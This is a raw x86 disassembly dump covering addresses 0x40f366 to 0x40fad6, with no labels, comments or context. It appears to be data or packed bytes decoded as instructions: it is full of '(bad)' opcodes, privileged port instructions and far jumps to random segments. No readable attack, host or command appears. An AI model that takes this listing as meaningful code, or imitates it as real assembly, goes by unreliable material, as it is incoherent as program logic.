  40f366:	hlt    
  40f367:	mov    ch,0x7e
  40f369:	rol    ecx,cl
  40f36b:	popa   
  40f36c:	push   ebx
  40f36d:	push   esp
  40f36e:	sahf   
  40f36f:	std    
  40f370:	dec    ebx
  40f371:	int    0xdf
  40f373:	stos   DWORD PTR es:[edi],eax
  40f374:	xchg   ecx,eax
  40f375:	cmp    DWORD PTR [ebx-0x5f],eax
  40f378:	scas   al,BYTE PTR es:[edi]
  40f379:	cmp    DWORD PTR [edx-0x41f0298e],esp
  40f37f:	cmp    eax,ebp
  40f381:	ret    
  40f382:	retf   0x5437
  40f385:	lahf   
  40f386:	and    DWORD PTR [edx],0x4921a190
  40f38c:	sub    eax,0x551f2243
  40f391:	in     al,dx
  40f392:	or     ah,BYTE PTR ds:0x399d7cac
  40f398:	js     0x40f395
  40f39a:	jmp    0x8157:0x12353a58
  40f3a1:	xor    eax,DWORD PTR [eax-0x73]
  40f3a4:	(bad)  
  40f3a5:	push   esi
  40f3a6:	mov    dh,0x2b
  40f3a8:	jne    0x40f422
  40f3aa:	ret    
  40f3ab:	push   ebx
  40f3ac:	shr    ebp,cl
  40f3ae:	out    0x73,al
  40f3b0:	push   0xfffffff4
  40f3b2:	and    BYTE PTR [eax],cl
  40f3b4:	mov    ds:0x4b2571d9,al
  40f3b9:	push   0xc
  40f3bb:	std    
  40f3bc:	mov    eax,0x87a67f46
  40f3c1:	sub    eax,0x8d86d9fa
  40f3c6:	in     al,0x43
  40f3c8:	hlt    
  40f3c9:	clc    
  40f3ca:	or     dl,BYTE PTR [ebx+0x2a]
  40f3cd:	je     0x40f41d
  40f3cf:	aam    0xb6
  40f3d1:	pop    ebp
  40f3d2:	inc    esp
  40f3d3:	(bad)  
  40f3d4:	frstor [ebx]
  40f3d6:	inc    ebp
  40f3d7:	arpl   WORD PTR [edi+esi*1],ax
  40f3da:	pop    ebx
  40f3db:	jo     0x40f431
  40f3dd:	ror    DWORD PTR [ecx+edx*8+0x53ac93ad],1
  40f3e4:	dec    edi
  40f3e5:	cmp    al,0xc5
  40f3e7:	out    dx,eax
  40f3e8:	inc    eax
  40f3e9:	das    
  40f3ea:	jmp    0x40f37a
  40f3ec:	rcl    BYTE PTR ds:0x7671b6d8,cl
  40f3f2:	dec    ecx
  40f3f3:	std    
  40f3f4:	pop    edx
  40f3f5:	inc    ecx
  40f3f6:	dec    eax
  40f3f7:	(bad)  
  40f3f8:	mov    edx,0x8bd28601
  40f3fd:	ins    DWORD PTR es:[edi],dx
  40f3fe:	pop    edi
  40f3ff:	and    BYTE PTR ds:0x1ec1e75f,cl
  40f405:	repnz pop edi
  40f407:	xor    DWORD PTR [ebx+edi*2-0x43],edi
  40f40b:	fist   WORD PTR [edi-0x77600aa1]
  40f411:	jnp    0x40f45f
  40f413:	rcr    edx,0x9b
  40f416:	sbb    eax,0xa2b53484
  40f41b:	int    0xd7
  40f41d:	cli    
  40f41e:	leave  
  40f41f:	push   esp
  40f420:	sbb    DWORD PTR [ecx],esi
  40f422:	clc    
  40f423:	imul   eax,DWORD PTR [eax+0xc],0x8696dc2
  40f42a:	sahf   
  40f42b:	sbb    ebx,ebp
  40f42d:	jge    0x40f414
  40f42f:	mov    ebp,0xf29c6b7a
  40f434:	fadd   st,st(3)
  40f436:	push   esi
  40f437:	scas   eax,DWORD PTR es:[edi]
  40f438:	shl    BYTE PTR [eax+ebp*2-0x5307bd10],0xad
  40f440:	sub    al,0x1b
  40f442:	daa    
  40f443:	inc    ecx
  40f444:	xor    DWORD PTR [esi-0x789e294d],esp
  40f44a:	fnstenv [edi-0x3017d7f8]
  40f450:	sub    eax,0xdb8dd8a4
  40f455:	aad    0x97
  40f457:	xor    bl,bh
  40f459:	add    eax,0x4baebbf9
  40f45e:	stos   DWORD PTR es:[edi],eax
  40f45f:	jmp    0x40f461
  40f461:	lahf   
  40f462:	jbe    0x40f4dc
  40f464:	mov    dh,0x54
  40f466:	imul   esi,DWORD PTR [ebx],0x2df2bc86
  40f46c:	mov    bl,0xd5
  40f46e:	sub    DWORD PTR [ebx],edx
  40f470:	in     al,0x7b
  40f472:	mov    esp,?
  40f474:	xor    eax,0xad474f45
  40f479:	xor    esi,edi
  40f47b:	pop    eax
  40f47c:	dec    esp
  40f47d:	mov    DWORD PTR ds:0xf410682b,eax
  40f483:	sbb    al,0x23
  40f485:	inc    esp
  40f486:	and    bl,BYTE PTR [eax-0x46e7c786]
  40f48c:	stc    
  40f48d:	stos   DWORD PTR es:[edi],eax
  40f48e:	sub    BYTE PTR [ebx],ch
  40f490:	pop    edx
  40f491:	in     al,0xa2
  40f493:	aam    0x8b
  40f495:	adc    cl,BYTE PTR [ebx+0x421ce235]
  40f49b:	add    BYTE PTR [ecx],al
  40f49d:	xor    cl,BYTE PTR [ebx+0x158b0875]
  40f4a3:	loop   0x40f4c1
  40f4a5:	inc    edx
  40f4a6:	add    BYTE PTR [ecx+0x510893f6],al
  40f4ac:	pop    es
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	hlt    
  40f4c5:	int    0x7f
  40f4c7:	fwait
  40f4c8:	dec    ebx
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx+0x3a]
  40f4d1:	inc    ebp
  40f4d2:	adc    BYTE PTR [edx+esi*4],cl
  40f4d5:	sbb    dh,BYTE PTR [edx-0x76]
  40f4d8:	mov    ecx,0x17bded48
  40f4dd:	mov    esp,0x44b22c2e
  40f4e2:	jnp    0x40f46e
  40f4e4:	add    ebx,ebx
  40f4e6:	(bad)  
  40f4e7:	aam    0x22
  40f4e9:	add    bl,al
  40f4eb:	icebp  
  40f4ec:	cmp    al,0xb2
  40f4ee:	sar    DWORD PTR [ebp+edi*4-0x33],0x65
  40f4f3:	imul   eax,DWORD PTR [esi+0x61],0x93635357
  40f4fa:	rcr    al,cl
  40f4fc:	lods   al,BYTE PTR ds:[esi]
  40f4fd:	mov    esi,0xc485d8ac
  40f502:	in     al,0x78
  40f504:	or     dl,BYTE PTR [eax+0x1f]
  40f507:	(bad)  
  40f508:	dec    edx
  40f509:	dec    ebx
  40f50a:	or     ebx,DWORD PTR [edx-0xbe16433]
  40f510:	ret    
  40f511:	add    DWORD PTR [edx-0x54],ebx
  40f514:	loop   0x40f528
  40f516:	in     eax,dx
  40f517:	xchg   dl,ch
  40f519:	test   edx,esi
  40f51b:	aad    0xcc
  40f51d:	ret    0xd96e
  40f520:	jge    0x40f4af
  40f522:	ins    DWORD PTR es:[edi],dx
  40f523:	stos   DWORD PTR es:[edi],eax
  40f524:	and    al,0xf7
  40f526:	outs   dx,BYTE PTR ds:[esi]
  40f527:	es (bad) 
  40f529:	adc    ebp,esi
  40f52b:	fimul  WORD PTR [ebx-0x5456c3a7]
  40f531:	stos   DWORD PTR es:[edi],eax
  40f532:	pop    ss
  40f533:	pusha  
  40f534:	mov    eax,ds:0x6ecfa323
  40f539:	push   0xffffffaa
  40f53b:	add    ebx,DWORD PTR [ebp-0x63]
  40f53e:	cmp    dl,0x69
  40f541:	and    dh,BYTE PTR [ebp+0x394c919]
  40f547:	test   eax,0x7d85f0ff
  40f54c:	push   ds
  40f54d:	jae    0x40f556
  40f54f:	sub    DWORD PTR [ecx+0x44],edx
  40f552:	stos   DWORD PTR es:[edi],eax
  40f553:	fisubr WORD PTR [esi]
  40f555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f556:	jo     0x40f530
  40f558:	push   esi
  40f559:	xor    bh,BYTE PTR [esi-0x7d075ee7]
  40f55f:	hlt    
  40f560:	scas   eax,DWORD PTR es:[edi]
  40f561:	or     DWORD PTR [edi+esi*4+0x68],0xffffffa4
  40f566:	sub    eax,DWORD PTR [edi+edi*1+0xadc5832]
  40f56d:	push   eax
  40f56e:	jmp    0xfd6:0x150153a4
  40f575:	sahf   
  40f576:	push   ebx
  40f577:	ins    DWORD PTR es:[edi],dx
  40f578:	mov    bh,0x46
  40f57a:	imul   edi,DWORD PTR [edx+0x6b],0x617806f4
  40f581:	sub    DWORD PTR [ecx+0x623f96b4],esp
  40f587:	scas   eax,DWORD PTR es:[edi]
  40f588:	fidiv  DWORD PTR [ebx-0xb50ab92]
  40f58e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f58f:	test   BYTE PTR [edx-0x99abbbe],bl
  40f595:	mov    DWORD PTR [esi-0x8],edi
  40f598:	(bad)  
  40f599:	int3   
  40f59a:	sbb    cl,ah
  40f59c:	retf   0xa13a
  40f59f:	mov    edx,0xc0b2b99d
  40f5a4:	fmul   QWORD PTR [ebp-0x3d966c0]
  40f5aa:	addr16 mov cs:0xb1ef,eax
  40f5af:	shl    DWORD PTR [edx-0x3c],0xa4
  40f5b3:	add    al,0x8a
  40f5b5:	xchg   ebx,eax
  40f5b6:	xlat   BYTE PTR ds:[ebx]
  40f5b7:	pop    ss
  40f5b8:	fidiv  DWORD PTR cs:[esi]
  40f5bb:	ds jo  0x40f5ec
  40f5be:	loopne 0x40f625
  40f5c0:	mov    al,dl
  40f5c2:	add    cl,BYTE PTR [esi]
  40f5c4:	mov    ds:0xae50ea17,eax
  40f5c9:	and    DWORD PTR ds:0x69712845,edx
  40f5cf:	cmp    al,0x5c
  40f5d1:	fsubr  DWORD PTR [ecx]
  40f5d3:	push   edx
  40f5d4:	xchg   edx,eax
  40f5d5:	or     BYTE PTR [edi+0x65],cl
  40f5d8:	mov    eax,0xcbbc4d84
  40f5dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5de:	push   0xffffffea
  40f5e0:	push   es
  40f5e1:	test   eax,ecx
  40f5e3:	hlt    
  40f5e4:	mov    dh,0x9f
  40f5e6:	(bad)  
  40f5e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5e8:	arpl   WORD PTR [ebp-0x53172dc7],di
  40f5ee:	jecxz  0x40f63a
  40f5f0:	cmp    bh,BYTE PTR [edx]
  40f5f2:	lods   eax,DWORD PTR ds:[esi]
  40f5f3:	fstp   QWORD PTR [eax-0x21255711]
  40f5f9:	fisttp WORD PTR [eax-0x44]
  40f5fc:	arpl   WORD PTR [edx-0x23a04f78],sp
  40f602:	mov    al,ds:0xfb913eab
  40f607:	(bad)  
  40f608:	mov    cr3,edi
  40f60b:	sahf   
  40f60c:	mov    al,ds:0xb5066b70
  40f611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f612:	scas   eax,DWORD PTR es:[edi]
  40f613:	dec    ecx
  40f614:	mov    ecx,0x842f04af
  40f619:	mov    ebp,0xfe101bfe
  40f61e:	mov    ebx,?
  40f620:	ror    DWORD PTR [edi+0x15bdc2d5],1
  40f626:	inc    ecx
  40f627:	push   edx
  40f628:	adc    dh,BYTE PTR [edx]
  40f62a:	in     al,dx
  40f62b:	dec    ebp
  40f62c:	div    BYTE PTR [edx+0x75]
  40f62f:	sub    eax,0xaa86a20f
  40f634:	int    0x19
  40f636:	scas   al,BYTE PTR es:[edi]
  40f637:	jecxz  0x40f5c9
  40f639:	xor    BYTE PTR [ebx+0x76835494],dl
  40f63f:	sub    eax,0x10a97523
  40f644:	inc    edx
  40f645:	out    dx,al
  40f646:	lock (bad) 
  40f648:	rcr    dh,1
  40f64a:	or     BYTE PTR [esi-0x2a],bh
  40f64d:	test   eax,0xc813d517
  40f652:	iretw  
  40f654:	pop    ds
  40f655:	xor    ecx,esi
  40f657:	mov    al,0xfd
  40f659:	aam    0x9e
  40f65b:	mov    bl,0x85
  40f65d:	lea    ecx,[edi+0x5c]
  40f660:	mov    ebp,0xde01ed4d
  40f665:	jo     0x40f63d
  40f667:	in     eax,0xa1
  40f669:	les    esi,FWORD PTR [edx+edx*1+0x4d]
  40f66d:	repz or BYTE PTR [esi],cl
  40f670:	loope  0x40f5f6
  40f672:	loopne 0x40f61c
  40f674:	test   DWORD PTR [ebx+0x664c8d06],ebx
  40f67a:	(bad)  
  40f67b:	mov    ebp,0x99c81d86
  40f680:	ja     0x40f65e
  40f682:	pop    ecx
  40f683:	push   esi
  40f684:	lea    ecx,[ebx]
  40f686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f687:	xchg   ebx,eax
  40f688:	xlat   BYTE PTR ds:[ebx]
  40f689:	jmp    0x8d74f131
  40f68e:	dec    ecx
  40f68f:	mov    ds:0xf952c29c,eax
  40f694:	cmovns ebx,esp
  40f697:	test   DWORD PTR [edx],ebx
  40f699:	jmp    0x40f6a7
  40f69b:	sub    BYTE PTR ds:0x782be18f,ch
  40f6a1:	aas    
  40f6a2:	sahf   
  40f6a3:	xor    dh,BYTE PTR [eax+0x161114d8]
  40f6a9:	jg     0x40f689
  40f6ab:	xchg   edx,eax
  40f6ac:	xchg   ebx,eax
  40f6ad:	(bad)  
  40f6ae:	(bad)  
  40f6af:	int3   
  40f6b0:	addr16 mov edi,0x5cd0a7ef
  40f6b6:	int    0xa5
  40f6b8:	cmc    
  40f6b9:	imul   ebp,DWORD PTR ds:0xc5ce0854,0x7e9b7e5d
  40f6c3:	aas    
  40f6c4:	add    al,0x93
  40f6c6:	and    ebx,eax
  40f6c8:	fs ins BYTE PTR es:[edi],dx
  40f6ca:	ins    BYTE PTR es:[edi],dx
  40f6cb:	idiv   BYTE PTR [eax+0x7c]
  40f6ce:	shl    edx,0xd2
  40f6d1:	ja     0x40f6b8
  40f6d3:	das    
  40f6d4:	mov    dh,0x15
  40f6d6:	xchg   ebp,eax
  40f6d7:	dec    ebx
  40f6d8:	es mov cl,0x47
  40f6db:	push   ebp
  40f6dc:	repz dec eax
  40f6de:	sbb    eax,0x1bbd3a50
  40f6e3:	or     BYTE PTR [edi-0x62fe1fdb],dh
  40f6e9:	outs   dx,BYTE PTR ds:[esi]
  40f6ea:	ja     0x40f6dc
  40f6ec:	retf   0xd79f
  40f6ef:	add    dl,ah
  40f6f1:	and    edi,DWORD PTR [edi+0x427f53a3]
  40f6f7:	add    eax,0xd2e50627
  40f6fc:	sbb    cl,cl
  40f6fe:	in     eax,0xaa
  40f700:	mov    ecx,0x481adcd6
  40f705:	test   BYTE PTR [esi+0x65],bh
  40f708:	fnstsw WORD PTR [esp+edx*4+0x4192874a]
  40f70f:	sbb    esp,DWORD PTR [edi]
  40f711:	mov    ebx,0x5676d9a1
  40f716:	sbb    eax,0x175889d0
  40f71b:	gs cwde 
  40f71d:	pop    ebx
  40f71e:	adc    ecx,DWORD PTR [esi+0x7fcebdc6]
  40f724:	clc    
  40f725:	cmp    DWORD PTR [edx-0x6],0x17103caa
  40f72c:	dec    ecx
  40f72d:	movsx  edi,BYTE PTR [ebx+0x24]
  40f731:	jge    0x40f7ae
  40f733:	mov    dl,0xa0
  40f735:	xor    BYTE PTR [ebp-0x7d],bh
  40f738:	das    
  40f739:	aad    0x26
  40f73b:	xchg   edx,eax
  40f73c:	sub    al,0xa2
  40f73e:	or     BYTE PTR [esi-0x4e],bh
  40f741:	cli    
  40f742:	lock dec edx
  40f744:	mov    BYTE PTR [ecx+edi*1-0x6a],dl
  40f748:	xchg   BYTE PTR [edi+0x737f1336],al
  40f74e:	push   ebp
  40f74f:	mov    ebp,0x4505111d
  40f754:	test   DWORD PTR [eax],ecx
  40f756:	inc    edx
  40f757:	xchg   edx,eax
  40f758:	inc    ebp
  40f759:	add    eax,0x74fce96d
  40f75e:	pushf  
  40f75f:	xchg   ah,dh
  40f761:	and    DWORD PTR [edi],0xb
  40f764:	inc    esi
  40f765:	xor    DWORD PTR [ebx-0x6a],ebx
  40f768:	imul   edi,DWORD PTR [eax-0x51],0xffffffed
  40f76c:	mov    ds,WORD PTR [ecx+0x70]
  40f76f:	mov    eax,0x30a6ac1d
  40f774:	fstp   TBYTE PTR [esi]
  40f776:	mov    eax,ds:0x7241bef2
  40f77b:	xor    ebp,DWORD PTR [edx]
  40f77d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40f77f:	xchg   ebx,eax
  40f780:	nop
  40f781:	jmp    0x40f772
  40f783:	sti    
  40f784:	and    al,0xa0
  40f786:	ds pop ss
  40f788:	sahf   
  40f789:	add    al,0xa4
  40f78b:	jecxz  0x40f785
  40f78d:	and    eax,0xdf54b1b5
  40f792:	inc    ebp
  40f793:	jno    0x40f734
  40f795:	xor    BYTE PTR [edx-0x41],bh
  40f798:	bnd jne 0x40f7a4
  40f79b:	sbb    BYTE PTR [ebp+0x4f],ch
  40f79e:	sub    ch,0xe9
  40f7a1:	aaa    
  40f7a2:	int3   
  40f7a3:	shl    DWORD PTR [esi-0x3ba0aab3],cl
  40f7a9:	icebp  
  40f7aa:	jns    0x40f800
  40f7ac:	cld    
  40f7ad:	pop    edx
  40f7ae:	dec    ecx
  40f7af:	adc    al,0xd0
  40f7b1:	pop    ebp
  40f7b2:	loopne 0x40f74c
  40f7b4:	xor    eax,0x8824ed54
  40f7b9:	dec    esi
  40f7ba:	fidivr DWORD PTR [edx-0x27]
  40f7bd:	mov    ecx,0xb73b631c
  40f7c2:	sbb    DWORD PTR [eax],eax
  40f7c4:	stos   BYTE PTR es:[edi],al
  40f7c5:	jmp    0x1ce6f534
  40f7ca:	dec    esp
  40f7cb:	pop    ds
  40f7cc:	out    dx,al
  40f7cd:	aad    0x10
  40f7cf:	dec    eax
  40f7d0:	cdq    
  40f7d1:	jmp    0x22bcc932
  40f7d6:	scas   al,BYTE PTR es:[edi]
  40f7d7:	shr    BYTE PTR [ecx+0x53],cl
  40f7da:	jnp    0x40f82b
  40f7dc:	mov    ah,0x9
  40f7de:	jmp    0x4015:0xcd73a1dd
  40f7e5:	rcl    DWORD PTR [eax-0x3],0x3b
  40f7e9:	and    al,ch
  40f7eb:	jecxz  0x40f7fd
  40f7ed:	sub    BYTE PTR [ecx+0x39],0x35
  40f7f1:	cli    
  40f7f2:	shr    bl,cl
  40f7f4:	dec    eax
  40f7f5:	bound  esp,QWORD PTR [edi+esi*8-0x4b493f82]
  40f7fc:	xor    ebp,DWORD PTR [esi-0x1104cce1]
  40f802:	and    cl,BYTE PTR [esi+0x6ebcd3a]
  40f808:	dec    edx
  40f809:	push   edi
  40f80a:	or     BYTE PTR [edi+0x64],al
  40f80d:	xor    edx,DWORD PTR [esi-0x6c]
  40f810:	sti    
  40f811:	jecxz  0x40f82f
  40f813:	add    al,0xdc
  40f815:	mov    ecx,0x5e66cc27
  40f81a:	out    dx,eax
  40f81b:	aaa    
  40f81c:	imul   ebp,DWORD PTR [eax+0x48],0x18bdbfd
  40f823:	pop    esi
  40f824:	pop    ss
  40f825:	(bad)  
  40f826:	pusha  
  40f827:	fucomip st,st(2)
  40f829:	call   0xf535:0x9128dc3
  40f830:	fsubr  DWORD PTR [ebp-0xcd256d7]
  40f836:	nop
  40f837:	in     al,dx
  40f838:	loop   0x40f83d
  40f83a:	cs test eax,0xfe7f31d5
  40f840:	push   esi
  40f841:	adc    bl,BYTE PTR ds:0x4f82687a
  40f847:	(bad)  
  40f848:	nop
  40f849:	cmp    BYTE PTR [eax],al
  40f84b:	ja     0x40f840
  40f84d:	jge    0x40f88a
  40f84f:	adc    al,0x12
  40f851:	xlat   BYTE PTR ds:[ebx]
  40f852:	add    esp,edx
  40f854:	inc    eax
  40f855:	arpl   cx,di
  40f857:	dec    ebp
  40f858:	add    BYTE PTR [ebx+0x3fd7a89d],ah
  40f85e:	sbb    eax,0x74a4c1a5
  40f863:	ins    DWORD PTR es:[edi],dx
  40f864:	dec    edi
  40f865:	pusha  
  40f866:	test   al,0xf6
  40f868:	pop    esp
  40f869:	cwde   
  40f86a:	fadd   st,st(0)
  40f86c:	in     eax,0xbd
  40f86e:	call   0x2573:0xc76d16f9
  40f875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f876:	sbb    DWORD PTR ds:0x26f57efd,ebx
  40f87c:	mov    BYTE PTR [edi],bl
  40f87e:	test   BYTE PTR [ecx+0x30],bh
  40f881:	adc    DWORD PTR [ebx],eax
  40f883:	das    
  40f884:	mov    edi,DWORD PTR [edi-0x19e798e0]
  40f88a:	pusha  
  40f88b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f88c:	bound  ecx,QWORD PTR [eax+0x449d697f]
  40f892:	pop    ss
  40f893:	out    dx,al
  40f894:	pop    es
  40f895:	fistp  QWORD PTR [edx-0x64]
  40f898:	pop    edx
  40f899:	mov    ecx,0x13ebf97c
  40f89e:	add    al,0x94
  40f8a0:	test   DWORD PTR [ecx],eax
  40f8a2:	push   ss
  40f8a3:	sbb    eax,0x3095488a
  40f8a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8a9:	or     BYTE PTR cs:[eax+ebp*8],dl
  40f8ad:	push   cs
  40f8ae:	sbb    BYTE PTR [ebp+0x6152eaa6],ah
  40f8b4:	pop    ebp
  40f8b5:	ja     0x40f85c
  40f8b7:	pop    ecx
  40f8b8:	xor    ch,BYTE PTR [ecx]
  40f8ba:	xchg   DWORD PTR [ebp+0x4c],ebx
  40f8bd:	push   ecx
  40f8be:	popa   
  40f8bf:	dec    ecx
  40f8c0:	(bad)  
  40f8c1:	push   edx
  40f8c2:	popf   
  40f8c3:	jmp    0x89a3:0x610b2a80
  40f8ca:	add    al,BYTE PTR [eax]
  40f8cc:	leave  
  40f8cd:	cmp    DWORD PTR [eax-0x45861c53],eax
  40f8d3:	xor    eax,0x49df71d1
  40f8d8:	ret    
  40f8d9:	scas   al,BYTE PTR es:[edi]
  40f8da:	les    esi,FWORD PTR [edx+ebp*1+0x4254526a]
  40f8e1:	jnp    0x40f904
  40f8e3:	adc    edi,DWORD PTR [ecx+edi*8-0x2a4e9269]
  40f8ea:	mov    BYTE PTR [ecx-0x52],ah
  40f8ed:	jbe    0x40f8b1
  40f8ef:	mov    BYTE PTR [esi],dl
  40f8f1:	pop    edi
  40f8f2:	scas   al,BYTE PTR es:[edi]
  40f8f3:	loopne 0x40f8c1
  40f8f5:	iret   
  40f8f6:	and    al,0xa2
  40f8f8:	adc    eax,DWORD PTR [edx+0x4c]
  40f8fb:	sub    edi,ebx
  40f8fd:	mov    ecx,DWORD PTR [ebp-0x20]
  40f900:	stc    
  40f901:	mov    ebp,0xdcd49b84
  40f906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f907:	aam    0xa1
  40f909:	mov    edx,0x9621ba03
  40f90e:	xchg   ebp,eax
  40f90f:	mov    ch,0xdf
  40f911:	call   0x2be39509
  40f916:	aam    0x91
  40f918:	inc    ebp
  40f919:	(bad)  
  40f91a:	imul   edi,DWORD PTR [edi+0x1f],0xffffffaa
  40f91e:	cwde   
  40f91f:	ins    DWORD PTR es:[edi],dx
  40f920:	mov    ebp,0x66134803
  40f925:	or     BYTE PTR ss:[esi+0x2b0910fb],0xe
  40f92d:	inc    eax
  40f92e:	jae    0x40f967
  40f930:	stos   DWORD PTR es:[edi],eax
  40f931:	popa   
  40f932:	test   ebp,edx
  40f934:	xor    al,0xba
  40f936:	shl    DWORD PTR [edi+0x1afc203],0x34
  40f93d:	out    0x53,eax
  40f93f:	xchg   BYTE PTR [esi+0x3bcc7fa],cl
  40f945:	adc    cl,BYTE PTR [ebx-0x773dc769]
  40f94b:	fcom   QWORD PTR [ecx-0x7142b3aa]
  40f951:	or     eax,0xccbdba7a
  40f956:	or     ebp,DWORD PTR [esi]
  40f958:	sti    
  40f959:	mov    esi,0xc1e05491
  40f95e:	stos   DWORD PTR es:[edi],eax
  40f95f:	je     0x40f901
  40f961:	shr    al,0xc1
  40f964:	aas    
  40f965:	fdivr  QWORD PTR [edx-0x7f99762b]
  40f96b:	mov    edi,0xbb5c860e
  40f970:	retf   0x9a03
  40f973:	popa   
  40f974:	loope  0x40f95c
  40f976:	scas   al,BYTE PTR es:[edi]
  40f977:	dec    eax
  40f978:	cmp    BYTE PTR [edi],dl
  40f97a:	pop    ds
  40f97b:	jb     0x40f9c1
  40f97d:	out    0xbd,al
  40f97f:	xchg   ebx,eax
  40f980:	mov    dh,0x5
  40f982:	dec    edx
  40f983:	add    dh,BYTE PTR [edi]
  40f985:	mov    al,ds:0xc331ef3f
  40f98a:	(bad)  
  40f98b:	(bad)  
  40f98c:	sbb    al,0x18
  40f98e:	sbb    DWORD PTR [esp+esi*4+0xb],esi
  40f992:	jae    0x40f977
  40f994:	lods   eax,DWORD PTR ds:[esi]
  40f995:	add    edx,DWORD PTR ds:0xad3cabfb
  40f99b:	pop    edi
  40f99c:	int    0xc6
  40f99e:	nop
  40f99f:	into   
  40f9a0:	push   ds
  40f9a1:	mov    edx,0x34868118
  40f9a6:	xchg   ecx,eax
  40f9a7:	aam    0x3f
  40f9a9:	sbb    BYTE PTR [ecx],bl
  40f9ab:	mov    esp,0x41c279bd
  40f9b0:	push   cs
  40f9b1:	fild   QWORD PTR [ebp+0x73ffe43f]
  40f9b7:	push   cs
  40f9b8:	mov    edi,0x7eeaf382
  40f9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9be:	pop    ecx
  40f9bf:	test   BYTE PTR [edx+0x1f],ah
  40f9c2:	fwait
  40f9c3:	ss clc 
  40f9c5:	pop    edi
  40f9c6:	jecxz  0x40f94a
  40f9c8:	arpl   WORD PTR [ebp+0x40aa8a47],di
  40f9ce:	mov    eax,ds:0xa50de757
  40f9d3:	ins    DWORD PTR es:[edi],dx
  40f9d4:	(bad)  
  40f9d5:	mov    esp,0xdad5cad2
  40f9da:	pop    ds
  40f9db:	or     DWORD PTR [edx],edi
  40f9dd:	mov    al,BYTE PTR [edi-0x44a1bd90]
  40f9e3:	cmp    al,0xc9
  40f9e5:	push   cs
  40f9e6:	xor    bl,BYTE PTR [edi-0x5b5fa457]
  40f9ec:	pop    ss
  40f9ed:	arpl   WORD PTR [ecx+eax*8-0x1e45c800],bx
  40f9f4:	call   0xda58:0xd57da173
  40f9fb:	sub    BYTE PTR [ebp-0x2f7eed6c],bl
  40fa01:	daa    
  40fa02:	and    eax,0xf0e171ee
  40fa07:	dec    esi
  40fa08:	xor    bl,dl
  40fa0a:	inc    ebx
  40fa0b:	push   eax
  40fa0c:	gs add al,0x68
  40fa0f:	dec    ecx
  40fa10:	cdq    
  40fa11:	out    dx,al
  40fa12:	das    
  40fa13:	outs   dx,BYTE PTR ds:[esi]
  40fa14:	sbb    edi,DWORD PTR [edx]
  40fa16:	int3   
  40fa17:	and    DWORD PTR [ecx-0x2f],ebp
  40fa1a:	cdq    
  40fa1b:	pop    eax
  40fa1c:	or     BYTE PTR [esi+edi*1],dl
  40fa1f:	mov    al,0xb8
  40fa21:	daa    
  40fa22:	jno    0x40f9ab
  40fa24:	jns    0x40fa22
  40fa26:	clc    
  40fa27:	cmp    BYTE PTR [ecx+0xd],dh
  40fa2a:	rol    DWORD PTR [esi],cl
  40fa2c:	mov    ebx,0x3610b12e
  40fa31:	iret   
  40fa32:	or     al,0x43
  40fa34:	cmp    eax,DWORD PTR [eax-0x7d]
  40fa37:	daa    
  40fa38:	repz ret 0x263a
  40fa3c:	in     al,0x57
  40fa3e:	xchg   ecx,eax
  40fa3f:	lock sbb dl,dh
  40fa42:	test   DWORD PTR [ebp+0x4e],eax
  40fa45:	(bad)  
  40fa46:	fsubp  st(1),st
  40fa48:	test   eax,0x38943c54
  40fa4d:	mov    bh,0x3e
  40fa4f:	cmp    eax,0x3f17a06b
  40fa54:	in     eax,0x13
  40fa56:	retf   0x4eb2
  40fa59:	adc    al,0x56
  40fa5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa5c:	outs   dx,DWORD PTR ds:[esi]
  40fa5d:	dec    edi
  40fa5e:	stc    
  40fa5f:	dec    esp
  40fa60:	outs   dx,DWORD PTR ds:[esi]
  40fa61:	mov    esp,0x38b8ee93
  40fa66:	push   edx
  40fa67:	inc    edi
  40fa68:	and    BYTE PTR [ebp+0x67],ah
  40fa6b:	dec    ecx
  40fa6c:	adc    al,0xd6
  40fa6e:	dec    eax
  40fa6f:	mov    ds:0xcf60ce8e,eax
  40fa74:	mov    dh,0xbd
  40fa76:	sub    ecx,esi
  40fa78:	inc    esp
  40fa79:	dec    eax
  40fa7a:	cld    
  40fa7b:	inc    ebp
  40fa7c:	and    BYTE PTR [ebx-0x48506865],0x8d
  40fa83:	push   ecx
  40fa84:	(bad)  
  40fa85:	jmp    ebp
  40fa87:	mov    ch,BYTE PTR [esp+eiz*4]
  40fa8a:	retf   0x380c
  40fa8d:	dec    esp
  40fa8e:	repz call 0x5e9f:0xa40743c0
  40fa96:	jmp    0x40fa41
  40fa98:	xor    eax,0x2ca10723
  40fa9d:	sbb    DWORD PTR [edx+0x71],esi
  40faa0:	inc    eax
  40faa1:	fadd   st(7),st
  40faa3:	mov    ds:0xdfb87b6a,al
  40faa8:	cmp    al,0x4f
  40faaa:	out    0x57,al
  40faac:	test   DWORD PTR [eax],0x832d7eb
  40fab2:	mov    ebx,0x7f59ae2d
  40fab7:	mov    BYTE PTR [edi+ebp*4-0x1e],bl
  40fabb:	int    0x38
  40fabd:	xchg   ecx,eax
  40fabe:	jp     0x40fa6a
  40fac0:	mov    eax,ds:0x729aa8b
  40fac5:	xor    edx,0xeb1def4a
  40facb:	sub    ah,bh
  40facd:	mov    cl,0x1a
  40facf:	mov    cl,0x39
  40fad1:	mov    eax,0x1bfa58b3
  40fad6:	call   0x816c:0x6bfd73a2
